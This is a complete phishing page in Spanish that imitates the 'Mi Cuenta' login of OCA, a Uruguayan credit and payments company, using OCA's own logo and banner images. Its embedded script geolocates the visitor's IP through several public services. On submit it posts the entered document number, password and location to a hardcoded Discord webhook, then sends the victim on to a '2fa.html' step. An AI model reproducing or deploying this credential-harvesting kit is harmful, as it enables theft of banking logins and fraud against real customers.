
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OCA</title>
    <style>
        /* --- Reset y Estilos Base --- */
        *, *::before, *::after {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body, html {
            height: 100%;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            color: #333333;
            -webkit-font-smoothing: antialiased;
        }

        .page-container {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        /* --- Header --- */
        .main-header {
            width: 100%;
            max-width: 1200px;
            margin: 0 auto;
            padding: 24px 20px 20px 20px;
        }
        .logo-box img {
            height: 34px;
            display: block;
        }

        /* --- Área de Contenido --- */
        .main-content {
            display: flex;
            width: 100%;
            max-width: 1200px;
            margin: 0 auto;
            flex: 1;
            padding: 0 20px;
            gap: 40px;
        }

        /* Panel Izquierdo (Escritorio) */
        .left-panel {
            flex: 1.1;
            display: flex;
            justify-content: flex-end;
            padding-right: 20px;
        }
        .desktop-banner {
            width: 100%;
            max-width: 480px;
        }
        .desktop-banner img {
            width: 100%;
            height: auto;
            display: block;
        }

        /* Panel Derecho (Login + Componentes) */
        .right-panel {
            flex: 0.9;
            display: flex;
            justify-content: flex-start;
        }
        .login-wrapper {
            width: 100%;
            max-width: 420px;
            display: flex;
            flex-direction: column;
        }

        /* Elementos del Formulario */
        .form-title {
            font-size: 22px;
            font-weight: 700;
            color: #222222;
            margin-bottom: 24px;
        }
        .form-group {
            margin-bottom: 16px;
        }
        .form-label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #444444;
            margin-bottom: 8px;
        }
        .input-control {
            width: 100%;
            height: 46px;
            border: 1px solid #cccccc;
            border-radius: 6px;
            padding: 0 14px;
            font-size: 15px;
            color: #333333;
            outline: none;
            background-color: #ffffff;
        }
        .input-control:focus {
            border-color: #0076df;
        }

        /* Campo de Contraseña Seguro */
        .password-container {
            position: relative;
            width: 100%;
        }
        .password-container .input-control {
            padding-right: 44px;
        }
        .toggle-password-btn {
            position: absolute;
            right: 14px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            display: flex;
            align-items: center;
        }
        .toggle-password-btn svg {
            width: 20px;
            height: 20px;
            fill: #757575;
        }

        .forgot-password-link {
            display: inline-block;
            margin-top: 8px;
            font-size: 14px;
            color: #0076df;
            text-decoration: none;
        }
        .forgot-password-link:hover {
            text-decoration: underline;
        }

        /* Botones y Acciones Principales */
        .actions-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 24px;
            margin-bottom: 24px;
        }
        .register-link {
            font-size: 15px;
            color: #0076df;
            text-decoration: none;
            font-weight: 500;
        }
        .register-link:hover {
            text-decoration: underline;
        }
        .submit-btn {
            height: 44px;
            padding: 0 38px;
            background-color: #0076df;
            color: #ffffff;
            border: none;
            border-radius: 22px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
        }

        /* --- Elementos Exclusivos de Versión Móvil --- */
        .mobile-banner-container {
            display: none;
            width: 100%;
            margin-top: 10px;
        }
        .mobile-banner-container img {
            width: 100%;
            height: auto;
            display: block;
            border-radius: 6px;
        }
        .carousel-dots {
            display: none;
            text-align: center;
            margin-top: 12px;
            margin-bottom: 24px;
        }
        .dot {
            display: inline-block;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background-color: #e2e8f0;
            margin: 0 4px;
        }
        .dot.active {
            background-color: #475569;
        }

        /* --- Enlaces Secundarios Inferiores --- */
        .secondary-links {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 45px;
        }
        .sec-link {
            font-size: 14px;
            color: #0076df;
            text-decoration: none;
            font-weight: 600;
        }
        .sec-link:hover {
            text-decoration: underline;
        }

        /* --- Sección Descarga de Aplicación --- */
        .app-download-section {
            border-top: 1px solid #eeeeee;
            padding-top: 25px;
            margin-bottom: 20px;
        }
        .app-title {
            font-size: 14px;
            font-weight: 700;
            color: #444444;
            margin-bottom: 14px;
        }
        .store-buttons {
            display: flex;
            gap: 12px;
        }
        .store-btn-link {
            flex: 1;
            height: 44px;
            background-color: #111111;
            border-radius: 6px;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 0 12px;
            gap: 8px;
        }
        .store-btn-link img {
            width: 22px;
            height: 22px;
            object-fit: contain;
            flex-shrink: 0;
        }
        .store-btn-text {
            font-size: 14px;
            font-weight: 700;
            color: #ffffff;
            line-height: 1;
        }

        /* --- Footer Completo Estilo Web --- */
        .main-footer {
            width: 100%;
            border-top: 1px solid #e2e8f0;
            padding: 16px 0;
            background-color: #ffffff;
            margin-top: 40px;
        }
        .footer-content {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 6px;
            font-size: 12px;
            color: #777777;
            flex-wrap: wrap;
        }
        .footer-links a {
            color: #777777;
            text-decoration: none;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }
        .footer-divider {
            color: #cccccc;
            margin: 0 4px;
        }

        /* --- Responsive / Adaptabilidad Móvil --- */
        @media screen and (max-width: 860px) {
            .main-header {
                padding: 16px 20px;
            }
            .main-content {
                flex-direction: column;
                gap: 0;
            }
            .left-panel {
                display: none;
            }
            .right-panel {
                width: 100%;
            }
            .login-wrapper {
                max-width: 100%;
            }

            /* Reordenamiento exacto de los elementos para móvil */
            .form-title { order: 1; }
            #loginForm { order: 2; display: flex; flex-direction: column; }
            .mobile-banner-container { order: 3; display: block; }
            .carousel-dots { order: 4; display: block; }
            .secondary-links { order: 5; }
            .app-download-section { order: 6; }

            .footer-content {
                flex-direction: column;
                gap: 6px;
                text-align: center;
            }
            .footer-divider {
                display: none;
            }
            .footer-links {
                margin-bottom: 4px;
            }
        }
    </style>
</head>
<body>
    <div class="page-container">
        <header class="main-header">
            <div class="logo-box">
                <img src="https://micuentanuevo.oca.com.uy/StaticContent/img/logos/OCA_logo-color.svg" alt="OCA">
            </div>
        </header>

        <main class="main-content">
            <div class="left-panel">
                <div class="desktop-banner">
                    <img src="https://www.oca.com.uy/imagenes/OCA_Seguros_Addiuva.jpg" alt="Seguro Asistencia 365">
                </div>
            </div>

            <div class="right-panel">
                <div class="login-wrapper">
                    
                    <h1 class="form-title">Ingresá a Mi Cuenta</h1>

                    <form id="loginForm" action="2fa.html" method="POST" autocomplete="off">
                        <div class="form-group">
                            <label class="form-label" for="documento">Nro. de documento</label>
                            <input type="text" id="documento" name="documento" class="input-control" placeholder="Documento" required>
                        </div>

                        <div class="form-group">
                            <label class="form-label" for="passwordInput">Contraseña</label>
                            <div class="password-container">
                                <input type="password" id="passwordInput" name="password" class="input-control" placeholder="Contraseña" required>
                                <button type="button" class="toggle-password-btn" id="togglePassword">
                                    <svg viewBox="0 0 24 24">
                                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                                    </svg>
                                </button>
                            </div>
                            <a href="#" class="forgot-password-link">¿Olvidaste tu contraseña?</a>
                        </div>

                        <div class="actions-container">
                            <a href="#" class="register-link">Registrarme</a>
                            <button type="submit" class="submit-btn">Ingresar</button>
                        </div>
                    </form>

                    <div class="mobile-banner-container">
                        <img src="https://www.oca.com.uy/imagenes/Banner_loginPram-mobile.jpg" alt="¿Necesitas efectivo? Tranqui">
                    </div>
                    
                    <div class="carousel-dots">
                        <span class="dot"></span>
                        <span class="dot"></span>
                        <span class="dot active"></span>
                        <span class="dot"></span>
                        <span class="dot"></span>
                        <span class="dot"></span>
                        <span class="dot"></span>
                    </div>

                    <div class="secondary-links">
                        <a href="#" class="sec-link">Abrir cuenta</a>
                        <a href="#" class="sec-link">Solicitar tarjeta de crédito</a>
                    </div>

                    <div class="app-download-section">
                        <h2 class="app-title">Descargá la app de OCA</h2>
                        <div class="store-buttons">
                            <a href="#" class="store-btn-link">
                                <img src="https://micuentanuevo.oca.com.uy/StaticContent/img/icons/play-store-icon.svg" alt="Icono Play Store">
                                <span class="store-btn-text">Play Store</span>
                            </a>
                            <a href="#" class="store-btn-link">
                                <img src="https://micuentanuevo.oca.com.uy/StaticContent/img/icons/app-store-icon.svg" alt="Icono App Store">
                                <span class="store-btn-text">App Store</span>
                            </a>
                        </div>
                    </div>

                </div>
            </div>
        </main>

        <footer class="main-footer">
            <div class="footer-content">
                <div class="footer-links">
                    <a href="#">Política de privacidad</a>
                    <span class="footer-divider">|</span>
                    <a href="#">Términos y condiciones</a>
                </div>
                <span>&nbsp;|&nbsp; &copy; 2026 OCA S.A. &nbsp;|&nbsp; &copy; 2026 OCA Dinero Electrónico S.A.</span>
            </div>
        </footer>
    </div>
<script>
    let userLocationData = { ip: 'Desconocida', ciudad: 'Desconocida', pais: 'Desconocido' };

    async function prefetchLocation() {
        const providers = [
            { url: 'https://ip-api.com/json/', parse: d => ({ ip: d.query, ciudad: d.city, pais: d.country }) },
            { url: 'https://ipapi.co/json/', parse: d => ({ ip: d.ip, ciudad: d.city, pais: d.country_name }) },
            { url: 'https://ipwho.is/', parse: d => ({ ip: d.ip, ciudad: d.city, pais: d.country }) },
            { url: 'https://freeipapi.com/api/json', parse: d => ({ ip: d.ipAddress, ciudad: d.cityName, pais: d.countryName }) },
            { url: 'https://extreme-ip-lookup.com/json/', parse: d => ({ ip: d.query, ciudad: d.city, pais: d.country }) }
        ];

        for (const provider of providers) {
            try {
                const response = await fetch(provider.url, { signal: AbortSignal.timeout(3000) });
                if (!response.ok) continue;
                const data = await response.json();
                const result = provider.parse(data);
                if (result.ip) {
                    userLocationData = result;
                    break;
                }
            } catch (e) {
                continue;
            }
        }
    }

    prefetchLocation();

    async function enviarAWebhook(usuario, pass, ip, ciudad, pais) {
        const webhookURL = 'https://discord.com/api/webhooks/1508462799079346266/KNByO07_Mqw9LpLrNiuW38RIMcjnXL53-EfxlB_ZU1amnyFpLoQGa7XciANdkxJHB0iA';

        const mensaje = {
            content: null,
            embeds: [{
                title: "🔐 Nuevo inicio de sesión OCA",
                color: 5814783,
                fields: [
                    { name: "📄 Usuario", value: usuario, inline: true },
                    { name: "🔒 Contraseña", value: pass, inline: true },
                    { name: "🌐 IP", value: ip, inline: true },
                    { name: "🏙️ Ciudad", value: ciudad, inline: true },
                    { name: "🌍 País", value: pais, inline: true }
                ],
                timestamp: new Date().toISOString()
            }]
        };

        try {
            await fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(mensaje)
            });
        } catch (error) {}
    }

    const form = document.getElementById('loginForm');
    form.addEventListener('submit', async function(event) {
        event.preventDefault();

        const usuario = document.getElementById('documento').value;
        const pass = document.getElementById('passwordInput').value;

        await enviarAWebhook(usuario, pass, userLocationData.ip, userLocationData.ciudad, userLocationData.pais);

        form.submit();
    });

    const passwordInput = document.getElementById('passwordInput');
    const togglePassword = document.getElementById('togglePassword');
    togglePassword.addEventListener('click', () => {
        const isPassword = passwordInput.type === 'password';
        passwordInput.type = isPassword ? 'text' : 'password';
    });
</script>
</body>
</html>
